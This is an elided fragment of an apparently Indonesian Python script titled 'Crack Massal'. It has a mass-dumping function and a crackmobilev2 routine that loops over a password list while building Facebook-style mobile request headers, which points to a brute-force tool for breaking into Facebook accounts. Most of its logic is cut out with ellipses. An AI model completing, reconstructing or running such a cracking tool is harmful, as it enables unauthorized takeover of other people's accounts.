...
def dump_massal():
	try:
		...
		exit()
	try:
		cetak(panel(f'[bold white]\t Apa Bila Udin Salah Kata maafkan lah[/]',width=70,title=f"[bold green]Crack Massal",style=f"{domris}"))
...
def crackmobilev2(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			"x-fb-rlafr":"0",
			"x-zero-eh":"d11f0de80fe92a6b68779482182f7a76",
			"content-length": "2133",
